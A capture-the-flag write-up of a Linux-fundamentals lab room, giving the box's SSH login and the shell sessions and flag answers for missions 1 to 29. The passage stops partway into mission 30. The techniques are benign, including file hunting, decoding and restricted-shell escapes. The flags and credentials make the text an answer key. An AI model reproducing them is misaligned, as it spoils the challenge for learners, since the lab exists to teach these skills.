# Linux Agency

#### This Room will help you to sharpen your Linux Skills and help you to learn basic privilege escalation in a HITMAN theme. So, pack your briefcase and grab your SilverBallers as its gonna be a tough ride.

### Task 1 Deploy The Machine

Welcome to Linux Agency. Agent 47, this is where you will need to go through several tests concerning linux fundamentals and privilege escalation techniques.

This room is proudly made by 0z09e and Xyan1d3

If you enjoy this room, please let us know by tagging us on Twitter. You may also contact us in case of some unintended routes or bugs, and we will be happy to resolve them.

```
Q1 Deploy This Machine
Ans: No Anwer Needed.
```

### Task 2 Let's just jump in

Please wait about 1 minute before SSH'ing into the box.

SSH Username : `agent47`

SSH Password : `640509040147`

Each flag found will serve as the password for the next user. The flag includes the username of the next user that is part of this challenge. The Flag format is : `username{md5sum}`

The order of users: agent47 --> mission1 --> mission30 will be part of Task 3: Linux Fundamentals.

After those missions, the next levels will be in Task 4: Privilege Escalation.

```
1. SSH into the box as agent47
Ans: No Answer Needed.
```

### Linux Fundamentals

Agent 47, we are ICA, the Linux Agency. We will test your Linux Fundamentals. Let's see if you can pass all these challenges of basic Linux. The password of the next mission will be the flag of that mission. Example: `mission1{1234567890}` will be the password for the mission1 user.

```
1. What is the mission1 flag?
Ans: mission1{174dc8f191bcbb161fe25f8a5b58d1f0}
```

```
$ ssh agent47@10.10.237.16
The authenticity of host '10.10.237.16 (10.10.237.16)' can't be established.
ECDSA key fingerprint is SHA256:NPQ78ILJE6Ra+F9r/z2ZUWdpPGeAHnuNAc5kOaFbTjU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.237.16' (ECDSA) to the list of known hosts.
agent47@10.10.237.16's password:
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

0 packages can be updated.
0 updates are security updates.

mission1{174dc8f191bcbb161fe25f8a5b58d1f0}
agent47@linuxagency:~$

```

```
2. What is the mission2 flag?
Ans: mission2{8a1b68bb11e4a35245061656b5b9fa0d}

```

```
mission1@linuxagency:/home/agent47$ cd ~
mission1@linuxagency:~$ ls -la
total 16
drwxr-x---  2 mission1 mission1 4096 Jan 12  2021 .
drwxr-xr-x 45 root     root     4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission1 mission1    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission1 mission1 3771 Jan 12  2021 .bashrc
-r--------  1 mission1 mission1    0 Jan 12  2021 mission2{8a1b68bb11e4a35245061656b5b9fa0d}
-rw-r--r--  1 mission1 mission1  807 Jan 12  2021 .profile
mission1@linuxagency:~$

```

```
3. What is the mission3 flag?
Ans: mission3{ab1e1ae5cba688340825103f70b0f976}
```

```
mission2@linuxagency:~$ ls -la
total 28
drwxr-x---  3 mission2 mission2 4096 Jan 12  2021 .
drwxr-xr-x 45 root     root     4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission2 mission2    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission2 mission2 3771 Jan 12  2021 .bashrc
-r--------  1 mission2 mission2   43 Jan 12  2021 flag.txt
drwxr-xr-x  3 mission2 mission2 4096 Jan 12  2021 .local
-rw-r--r--  1 mission2 mission2  807 Jan 12  2021 .profile
-rw-------  1 mission2 mission2  726 Jan 12  2021 .viminfo
mission2@linuxagency:~$ cat flag.txt
mission3{ab1e1ae5cba688340825103f70b0f976}
mission2@linuxagency:~$

```

```
4. What is the mission4 flag?
Ans: mission4{264a7eeb920f80b3ee9665fafb7ff92d}
```

```
mission3@linuxagency:~$ ls -la
total 28
drwxr-x---  3 mission3 mission3 4096 Jan 12  2021 .
drwxr-xr-x 45 root     root     4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission3 mission3    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission3 mission3 3771 Jan 12  2021 .bashrc
-r--------  1 mission3 mission3  101 Jan 12  2021 flag.txt
-rw-------  1 mission3 mission3   34 Jan 12  2021 .lesshst
drwxr-xr-x  3 mission3 mission3 4096 Jan 12  2021 .local
-rw-r--r--  1 mission3 mission3  807 Jan 12  2021 .profile
mission3@linuxagency:~$ cat flag.txt
I am really sorry man the flag is stolen by some thief's.
mission3@linuxagency:~$ cat -v flag.txt
mission4{264a7eeb920f80b3ee9665fafb7ff92d}^MI am really sorry man the flag is stolen by some thief's.
mission3@linuxagency:~$

```

```
5. What is the mission5 flag?
Ans: mission5{bc67906710c3a376bcc7bd25978f62c0}
```

```
mission4@linuxagency:/home/mission3$ cd ~
mission4@linuxagency:~$ ls -la
total 20
drwxr-x---  3 mission4 mission4 4096 Jan 12  2021 .
drwxr-xr-x 45 root     root     4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission4 mission4    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission4 mission4 3771 Jan 12  2021 .bashrc
drwxr-xr-x  2 mission4 mission4 4096 Jan 12  2021 flag
-rw-r--r--  1 mission4 mission4  807 Jan 12  2021 .profile
mission4@linuxagency:~$ cd flag/
mission4@linuxagency:~/flag$ ls -la
total 12
drwxr-xr-x 2 mission4 mission4 4096 Jan 12  2021 .
drwxr-x--- 3 mission4 mission4 4096 Jan 12  2021 ..
-r-------- 1 mission4 mission4   43 Jan 12  2021 flag.txt
mission4@linuxagency:~/flag$ cat flag.txt
mission5{bc67906710c3a376bcc7bd25978f62c0}
mission4@linuxagency:~/flag$
```

```
6. What is the mission6 flag?
Ans: mission6{1fa67e1adc244b5c6ea711f0c9675fde}
```

```
mission5@linuxagency:/home/mission4/flag$ cd ~
mission5@linuxagency:~$ ls -la
total 20
drwxr-x---  2 mission5 mission5 4096 Jan 12  2021 .
drwxr-xr-x 45 root     root     4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission5 mission5    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission5 mission5 3771 Jan 12  2021 .bashrc
-r--------  1 mission5 mission5   43 Jan 12  2021 .flag.txt
-rw-r--r--  1 mission5 mission5  807 Jan 12  2021 .profile
mission5@linuxagency:~$ cat .flag.txt
mission6{1fa67e1adc244b5c6ea711f0c9675fde}
mission5@linuxagency:~$

```

```
7. What is the mission7 flag?
Ans: mission7{53fd6b2bad6e85519c7403267225def5}
```

```
mission6@linuxagency:/home/mission5$ cd ~
mission6@linuxagency:~$ ls -la
total 20
drwxr-x---  3 mission6 mission6 4096 Jan 12  2021 .
drwxr-xr-x 45 root     root     4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission6 mission6    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission6 mission6 3771 Jan 12  2021 .bashrc
drwxr-xr-x  2 mission6 mission6 4096 Jan 12  2021 .flag
-rw-r--r--  1 mission6 mission6  807 Jan 12  2021 .profile
mission6@linuxagency:~$ cd .flag/
mission6@linuxagency:~/.flag$ ls -la
total 12
drwxr-xr-x 2 mission6 mission6 4096 Jan 12  2021 .
drwxr-x--- 3 mission6 mission6 4096 Jan 12  2021 ..
-r-------- 1 mission6 mission6   43 Jan 12  2021 flag.txt
mission6@linuxagency:~/.flag$ cat flag.txt
mission7{53fd6b2bad6e85519c7403267225def5}
mission6@linuxagency:~/.flag$

```

```
8. What is the mission8 flag?
Ans: mission8{3bee25ebda7fe7dc0a9d2f481d10577b}
```

```
mission7@linuxagency:/home/mission7$ ls -la
total 20
drwxr-x---  2 mission7 mission7 4096 Jan 12  2021 .
drwxr-xr-x 45 root     root     4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission7 mission7    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission7 mission7 3771 Jan 12  2021 .bashrc
-r--------  1 mission7 mission7   43 Jan 12  2021 flag.txt
-rw-r--r--  1 mission7 mission7  807 Jan 12  2021 .profile
mission7@linuxagency:/home/mission7$ cat flag.txt
mission8{3bee25ebda7fe7dc0a9d2f481d10577b}
mission7@linuxagency:/home/mission7$

```

```
9. What is the mission9 flag?
Ans: mission9{ba1069363d182e1c114bef7521c898f5}
```

```
mission8@linuxagency:/home/mission7$ cd ~
mission8@linuxagency:~$ ls -la
total 16
drwxr-x---  2 mission8 mission8 4096 Jan 12  2021 .
drwxr-xr-x 45 root     root     4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission8 mission8    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission8 mission8 3771 Jan 12  2021 .bashrc
-rw-r--r--  1 mission8 mission8  807 Jan 12  2021 .profile
mission8@linuxagency:~$ find / -name "flag.txt" 2>/dev/null
/flag.txt
mission8@linuxagency:~$ cd /flag.txt
bash: cd: /flag.txt: Not a directory
mission8@linuxagency:~$ cat /flag.txt
mission9{ba1069363d182e1c114bef7521c898f5}
mission8@linuxagency:~$

```

```
10. What is the mission10 flag?
Ans: mission10{0c9d1c7c5683a1a29b05bb67856524b6}
```

```
mission9@linuxagency:~$ ls -la
total 136664
drwxr-x---  2 mission9 mission9      4096 Jan 12  2021 .
drwxr-xr-x 45 root     root          4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission9 mission9         9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission9 mission9      3771 Jan 12  2021 .bashrc
-rw-r--r--  1 mission9 mission9       807 Jan 12  2021 .profile
-r--------  1 mission9 mission9 139921551 Jan 12  2021 rockyou.txt
mission9@linuxagency:~$ grep mission10 rockyou.txt
mission101
mission10
mission10{0c9d1c7c5683a1a29b05bb67856524b6}
mission1098
mission108
mission9@linuxagency:~$
```

```
11. What is the mission11 flag?
Ans: mission11{db074d9b68f06246944b991d433180c0}

```

```
mission10@linuxagency:~$ ls -la
total 24
drwxr-x---  4 mission10 mission10 4096 Jan 12  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission10 mission10    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission10 mission10 3771 Jan 12  2021 .bashrc
drwxr-xr-x 12 mission10 mission10 4096 Jan 12  2021 folder
drwxr-xr-x  3 mission10 mission10 4096 Jan 12  2021 .local
-rw-r--r--  1 mission10 mission10  807 Jan 12  2021 .profile
mission10@linuxagency:~$ find / -name "flag.txt" -type f 2>/dev/null
/home/mission10/folder/L4D8/L3D7/L2D2/L1D10/flag.txt
/flag.txt
mission10@linuxagency:~$ cat /home/mission10/folder/L4D8/L3D7/L2D2/L1D10/flag.txt
mission11{db074d9b68f06246944b991d433180c0}
mission10@linuxagency:~$

```

```
12. What is the mission12 flag?
Ans: mission12{f449a1d33d6edc327354635967f9a720}

```

```
mission11@linuxagency:~$ env | grep mission
USER=mission11
PWD=/home/mission11
HOME=/home/mission11
MAIL=/var/mail/mission11
FLAG=mission12{f449a1d33d6edc327354635967f9a720}
flag=mission12{f449a1d33d6edc327354635967f9a720}
LOGNAME=mission11
mission11@linuxagency:~$

```

```
13. What is the mission13 flag?
Ans: mission13{076124e360406b4c98ecefddd13ddb1f}

```

```
mission12@linuxagency:~$ ls -la
total 20
drwxr-x---  2 mission12 mission12 4096 Jan 12  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission12 mission12    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission12 mission12 3771 Jan 12  2021 .bashrc
----------  1 mission12 mission12   44 Jan 12  2021 flag.txt
-rw-r--r--  1 mission12 mission12  807 Jan 12  2021 .profile
mission12@linuxagency:~$ chmod 700 flag.txt
mission12@linuxagency:~$ cat flag.txt
mission13{076124e360406b4c98ecefddd13ddb1f}
mission12@linuxagency:~$

```

```
14. What is the mission14 flag?
Ans: mission14{d598de95639514b9941507617b9e54d2}

```

```
mission13@linuxagency:/home/mission12$ cd ~
mission13@linuxagency:~$ ls -la
total 28
drwxr-x---  3 mission13 mission13 4096 Jan 12  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission13 mission13    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission13 mission13 3771 Jan 12  2021 .bashrc
-r--------  1 mission13 mission13   61 Jan 12  2021 flag.txt
drwxr-xr-x  3 mission13 mission13 4096 Jan 12  2021 .local
-rw-r--r--  1 mission13 mission13  807 Jan 12  2021 .profile
-rw-------  1 mission13 mission13  978 Jan 12  2021 .viminfo
mission13@linuxagency:~$ cat flag.txt
bWlzc2lvbjE0e2Q1OThkZTk1NjM5NTE0Yjk5NDE1MDc2MTdiOWU1NGQyfQo=
mission13@linuxagency:~$ echo "bWlzc2lvbjE0e2Q1OThkZTk1NjM5NTE0Yjk5NDE1MDc2MTdiOWU1NGQyfQo=" | base64 -d
mission14{d598de95639514b9941507617b9e54d2}
mission13@linuxagency:~$

```

```
15. What is the mission15 flag?
Ans: mission15{fc4915d818bfaeff01185c3547f25596}
```

```
mission14@linuxagency:~$ ls -la
total 20
drwxr-x---  2 mission14 mission14 4096 Jan 12  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission14 mission14    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission14 mission14 3771 Jan 12  2021 .bashrc
-r--------  1 mission14 mission14  345 Jan 12  2021 flag.txt
-rw-r--r--  1 mission14 mission14  807 Jan 12  2021 .profile
mission14@linuxagency:~$ cat flag.txt
01101101011010010111001101110011011010010110111101101110001100010011010101111011011001100110001100110100001110010011000100110101011001000011100000110001001110000110001001100110011000010110010101100110011001100011000000110001001100010011100000110101011000110011001100110101001101000011011101100110001100100011010100110101001110010011011001111101
mission14@linuxagency:~$

```

```
16. What is the mission16 flag?
Ans: mission16{884417d40033c4c2091b44d7c26a908e}
```

```
mission15@linuxagency:~$ ls -la
total 20
drwxr-x---  2 mission15 mission15 4096 Jan 12  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission15 mission15    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission15 mission15 3771 Jan 12  2021 .bashrc
-r--------  1 mission15 mission15   87 Jan 12  2021 flag.txt
-rw-r--r--  1 mission15 mission15  807 Jan 12  2021 .profile
mission15@linuxagency:~$ cat flag.txt
6D697373696F6E31367B38383434313764343030333363346332303931623434643763323661393038657D
mission15@linuxagency:~$ echo '6D697373696F6E31367B38383434313764343030333363346332303931623434643763323661393038657D' | xxd -r -p
mission16{884417d40033c4c2091b44d7c26a908e}mission15@linuxagency:~$

```

```
17. What is the mission17 flag?
Ans: mission17{49f8d1348a1053e221dfe7ff99f5cbf4}
```

```
mission16@linuxagency:~$ ls -la
total 28
drwxr-x---  2 mission16 mission16 4096 Jan 12  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission16 mission16    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission16 mission16 3771 Jan 12  2021 .bashrc
-r--------  1 mission16 mission16 8440 Jan 12  2021 flag
-rw-r--r--  1 mission16 mission16  807 Jan 12  2021 .profile
mission16@linuxagency:~$ file flag
flag: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=1606102f7b80d832eabee1087180ea7ce24a96ca, not stripped
mission16@linuxagency:~$ chmod 700 flag
mission16@linuxagency:~$ ./flag

mission17{49f8d1348a1053e221dfe7ff99f5cbf4}

mission16@linuxagency:~$

```

```
18. What is the mission18 flag?
Ans: mission18{f09760649986b489cda320ab5f7917e8}
```

```
mission17@linuxagency:/home/mission16$ cd ~
mission17@linuxagency:~$ ls -la
total 20
drwxr-x---  2 mission17 mission17 4096 Jan 12  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission17 mission17    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission17 mission17 3771 Jan 12  2021 .bashrc
-rwxr-xr-x  1 mission17 mission17  475 Jan 12  2021 flag.java
-rw-r--r--  1 mission17 mission17  807 Jan 12  2021 .profile
mission17@linuxagency:~$ javac flag.java
mission17@linuxagency:~$ ls -la
total 24
drwxr-x---  2 mission17 mission17 4096 Aug 29 09:50 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission17 mission17    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission17 mission17 3771 Jan 12  2021 .bashrc
-rw-rw-r--  1 mission17 mission17 1199 Aug 29 09:50 flag.class
-rwxr-xr-x  1 mission17 mission17  475 Jan 12  2021 flag.java
-rw-r--r--  1 mission17 mission17  807 Jan 12  2021 .profile
mission17@linuxagency:~$ java flag
mission18{f09760649986b489cda320ab5f7917e8}
mission17@linuxagency:~$

```

```
19. What is the mission19 flag?
Ans: mission19{a0bf41f56b3ac622d808f7a4385254b7}
```

```
mission17@linuxagency:~$ su mission18
Password:
mission18@linuxagency:/home/mission17$ cd ~
mission18@linuxagency:~$ ls -la
total 20
drwxr-x---  2 mission18 mission18 4096 Jan 12  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission18 mission18    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission18 mission18 3771 Jan 12  2021 .bashrc
-r--------  1 mission18 mission18  312 Jan 12  2021 flag.rb
-rw-r--r--  1 mission18 mission18  807 Jan 12  2021 .profile
mission18@linuxagency:~$ chmod 700 flag.rb
mission18@linuxagency:~$ ruby flag.rb
mission19{a0bf41f56b3ac622d808f7a4385254b7}
mission18@linuxagency:~$

```

```
20. What is the mission20 flag?
Ans: mission20{b0482f9e90c8ad2421bf4353cd8eae1c}
```

```
mission19@linuxagency:~$ gcc flag.c -o flag
flag.c: In function ‘main’:
flag.c:5:18: warning: implicit declaration of function ‘strlen’ [-Wimplicit-function-declaration]
     int length = strlen(flag);
                  ^~~~~~
flag.c:5:18: warning: incompatible implicit declaration of built-in function ‘strlen’
flag.c:5:18: note: include ‘<string.h>’ or provide a declaration of ‘strlen’
mission19@linuxagency:~$ ls -la
total 32
drwxr-x---  2 mission19 mission19 4096 Aug 29 10:05 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission19 mission19    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission19 mission19 3771 Jan 12  2021 .bashrc
-rwxrwxr-x  1 mission19 mission19 8432 Aug 29 10:05 flag
-r--------  1 mission19 mission19  276 Jan 12  2021 flag.c
-rw-r--r--  1 mission19 mission19  807 Jan 12  2021 .profile
mission19@linuxagency:~$ ./flag
mission20{b0482f9e90c8ad2421bf4353cd8eae1c}

mission19@linuxagency:~$

```

```
21. What is the mission21 flag?
Ans: mission21{7de756aabc528b446f6eb38419318f0c}
```

```
mission20@linuxagency:/home/mission19$ cd ~
mission20@linuxagency:~$ ls -la
total 20
drwxr-x---  2 mission20 mission20 4096 Jan 12  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission20 mission20    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission20 mission20 3771 Jan 12  2021 .bashrc
-r--------  1 mission20 mission20  186 Jan 12  2021 flag.py
-rw-r--r--  1 mission20 mission20  807 Jan 12  2021 .profile
mission20@linuxagency:~$ python flag.py
mission21{7de756aabc528b446f6eb38419318f0c}
mission20@linuxagency:~$

```

```
22. What is the mission22 flag?
Ans: mission22{24caa74eb0889ed6a2e6984b42d49aaf}
```

```
$ /bin/bash
mission22{24caa74eb0889ed6a2e6984b42d49aaf}
mission21@linuxagency:~$

```

```
23. What is the mission23 flag?
Ans: mission23{3710b9cb185282e3f61d2fd8b1b4ffea}
```

```
mission21@linuxagency:~$ su mission22
Password:
Python 3.6.9 (default, Oct  8 2020, 12:12:24)
[GCC 8.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.

>>> import pty;pty.spawn("/bin/bash")
mission22@linuxagency:/home/mission21$ cd ~
mission22@linuxagency:~$ ls -l
total 4
-r-------- 1 mission22 mission22 44 Jan 12  2021 flag.txt
mission22@linuxagency:~$ cat flag.txt
mission23{3710b9cb185282e3f61d2fd8b1b4ffea}
mission22@linuxagency:~$

```

```
24. What is the mission24 flag?
Ans: mission24{dbaeb06591a7fd6230407df3a947b89c}
```

```
mission22@linuxagency:~$ su mission23
Password:
mission23@linuxagency:/home/mission22$ cd ~
mission23@linuxagency:~$ ls -la
total 24
drwxr-x---  3 mission23 mission23 4096 Jan 15  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission23 mission23    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission23 mission23 3771 Jan 12  2021 .bashrc
drwxrwxr-x  3 mission23 mission23 4096 Jan 12  2021 .local
-r--------  1 mission23 mission23   69 Jan 15  2021 message.txt
-rw-r--r--  1 mission23 mission23  807 Jan 12  2021 .profile
mission23@linuxagency:~$ cat message.txt
The hosts will help you.
[OPTIONAL] Maybe you will need curly hairs.
mission23@linuxagency:~$ cat /etc/hosts
127.0.0.1       localhost       linuxagency     mission24.com
127.0.1.1       ubuntu  linuxagency

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback      linuxagency
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
mission23@linuxagency:~$ wget mission24.com
--2021-08-29 10:27:19--  http://mission24.com/
Resolving mission24.com (mission24.com)... 127.0.0.1
Connecting to mission24.com (mission24.com)|127.0.0.1|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10924 (11K) [text/html]
Saving to: ‘index.html’

index.html          100%[===================>]  10.67K  --.-KB/s    in 0s

2021-08-29 10:27:19 (388 MB/s) - ‘index.html’ saved [10924/10924]

mission23@linuxagency:~$ ls -la
total 36
drwxr-x---  3 mission23 mission23  4096 Aug 29 10:27 .
drwxr-xr-x 45 root      root       4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission23 mission23     9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission23 mission23  3771 Jan 12  2021 .bashrc
-rw-rw-r--  1 mission23 mission23 10924 Jan 12  2021 index.html
drwxrwxr-x  3 mission23 mission23  4096 Jan 12  2021 .local
-r--------  1 mission23 mission23    69 Jan 15  2021 message.txt
-rw-r--r--  1 mission23 mission23   807 Jan 12  2021 .profile
mission23@linuxagency:~$ cat index.html | grep mission
    <title>mission24{dbaeb06591a7fd6230407df3a947b89c}</title>
mission23@linuxagency:~$

```

```
25. What is the mission25 flag?
Ans: mission25{61b93637881c87c71f220033b22a921b}
```

```
mission24@linuxagency:~$ ls -la
total 40
drwxr-x---  3 mission24 mission24 4096 Feb  1  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission24 mission24    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission24 mission24 3771 Jan 12  2021 .bashrc
-rwxr-xr-x  1 mission24 mission24 8576 Jan 12  2021 bribe
drwxr-xr-x  3 mission24 mission24 4096 Jan 12  2021 .local
-rw-r--r--  1 mission24 mission24  807 Jan 12  2021 .profile
-rw-------  1 mission24 mission24 4934 Jan 12  2021 .viminfo
mission24@linuxagency:~$ export pocket=money
mission24@linuxagency:~$ ./bribe
Here ya go!!!
mission25{61b93637881c87c71f220033b22a921b}
Don't tell police about the deal man ;)

mission24@linuxagency:~$

```

```
26. What is the mission26 flag?
Ans: mission26{cb6ce977c16c57f509e9f8462a120f00}

```

```
mission24@linuxagency:~$ su mission25
Password:
mission25@linuxagency:/home/mission24$ clear
bash: clear: Permission denied
mission25@linuxagency:/home/mission24$ cd ~
mission25@linuxagency:~$ clear
bash: clear: No such file or directory
mission25@linuxagency:~$ ls -la
bash: ls: No such file or directory
mission25@linuxagency:~$ export TERM=xterm
mission25@linuxagency:~$ ls -la
bash: ls: No such file or directory
mission25@linuxagency:~$ /usr/bin/ls -a
bash: /usr/bin/ls: No such file or directory
mission25@linuxagency:~$ which ls
bash: which: No such file or directory
mission25@linuxagency:~$ /usr/bin/which
mission25@linuxagency:~$ /usr/bin/which ls
mission25@linuxagency:~$ clear
bash: clear: No such file or directory
mission25@linuxagency:~$ pwd
/home/mission25
mission25@linuxagency:~$ export PATH=/bin
mission25@linuxagency:~$ ls
flag.txt
mission25@linuxagency:~$ cat flag.txt
mission26{cb6ce977c16c57f509e9f8462a120f00}
mission25@linuxagency:~$
```

```
27. What is the mission27 flag?
Ans: mission27{444d29b932124a48e7dddc0595788f4d}
```

```
mission25@linuxagency:~$ su mission26
Password:
mission26@linuxagency:/home/mission25$ cd ~
mission26@linuxagency:~$ ls -la
total 100
drwxr-x---  2 mission26 mission26  4096 Jan 12  2021 .
drwxr-xr-x 45 root      root       4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission26 mission26     9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission26 mission26  3771 Jan 12  2021 .bashrc
-r--------  1 mission26 mission26 85980 Jan 12  2021 flag.jpg
-rw-r--r--  1 mission26 mission26   807 Jan 12  2021 .profile
mission26@linuxagency:~$ file flag.jpg
flag.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 100x100, segment length 16, comment: "mission27{444d29b932124a48e7dddc0595788f4d}", progressive, precision 8, 1000x1870, frames 3
mission26@linuxagency:~$

```

```
27. What is the mission28 flag?
Ans: mission28{03556f8ca983ef4dc26d2055aef9770f}
```

```
mission27@linuxagency:~$ ls -la
total 20
drwxr-x---  2 mission27 mission27 4096 Jan 12  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission27 mission27    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission27 mission27 3771 Jan 12  2021 .bashrc
-rw-r--r--  1 mission27 mission27  136 Jan 12  2021 flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png.gz
-rw-r--r--  1 mission27 mission27  807 Jan 12  2021 .profile
mission27@linuxagency:~$ gunzip flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png.gz
mission27@linuxagency:~$ ls -la
total 20
drwxr-x---  2 mission27 mission27 4096 Aug 31 09:24 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission27 mission27    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission27 mission27 3771 Jan 12  2021 .bashrc
-rw-r--r--  1 mission27 mission27   51 Jan 12  2021 flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png
-rw-r--r--  1 mission27 mission27  807 Jan 12  2021 .profile
mission27@linuxagency:~$ file flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png
flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png: GIF image data, version 87a, 27914 x 29545
mission27@linuxagency:~$ strings flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png
GIF87a
mission28{03556f8ca983ef4dc26d2055aef9770f}
mission27@linuxagency:~$

```

```
29. What is the mission29 flag?
Ans: mission29{8192b05d8b12632586e25be74da2fff1}
```

```
agent47@linuxagency:~$ su mission28
Password:

irb(main):004:0> exec('/bin/bash')
mission28@linuxagency:/home/agent47$ ls -la
ls: cannot open directory '.': Permission denied
mission28@linuxagency:/home/agent47$ cd ~
mission28@linuxagency:~$ ls -la
total 40
drwxr-x---  3 mission28 mission28 4096 Jan 12  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission28 mission28    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission28 mission28  220 Jan 12  2021 .bash_logout
-rw-r--r--  1 mission28 mission28 3771 Jan 12  2021 .bashrc
-rw-r--r--  1 mission28 mission28 8980 Jan 12  2021 examples.desktop
drwxr-xr-x  3 mission28 mission28 4096 Jan 12  2021 .local
-rw-r--r--  1 mission28 mission28  807 Jan 12  2021 .profile
-r--------  1 mission28 mission28   44 Jan 12  2021 txt.galf
mission28@linuxagency:~$ file txt.galf
txt.galf: ASCII text
mission28@linuxagency:~$ cat txt.galf
}1fff2ad47eb52e68523621b8d50b2918{92noissim
mission28@linuxagency:~$ cat txt.galf | rev
mission29{8192b05d8b12632586e25be74da2fff1}
mission28@linuxagency:~$

```

```
29. What is the mission30 flag?
Ans: mission30{d25b4c9fac38411d2fcb4796171bda6e}
```

```
mission28@linuxagency:~$ su mission29
Password:
mission29@linuxagency:/home/mission28$ cd ~
mission29@linuxagency:~$ ls -la
total 20
drwxr-x---  3 mission29 mission29 4096 Jan 12  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission29 mission29    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission29 mission29 3771 Jan 12  2021 .bashrc
drwxr-xr-x  7 mission29 mission29 4096 Jan 12  2021 bludit
-rw-r--r--  1 mission29 mission29  807 Jan 12  2021 .profile
mission29@linuxagency:~$ cd bludit/
mission29@linuxagency:~/bludit$ ls -la
total 44
drwxr-xr-x  7 mission29 mission29 4096 Jan 12  2021 .
drwxr-x---  3 mission29 mission29 4096 Jan 12  2021 ..
drwxr-xr-x  2 mission29 mission29 4096 Jan 12  2021 bl-content
